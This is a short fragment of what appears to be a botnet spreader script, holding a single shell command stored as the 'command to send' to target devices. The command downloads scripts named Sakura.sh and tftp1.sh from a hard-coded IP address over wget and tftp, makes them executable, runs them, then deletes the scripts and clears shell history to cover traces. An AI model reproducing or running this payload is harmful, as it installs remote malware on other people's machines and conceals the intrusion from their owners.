...
cmd="cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://188.130.138.39/Sakura.sh; chmod 777 *; sh Sakura.sh; tftp -g 188.130.138.39 -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c" #command to send
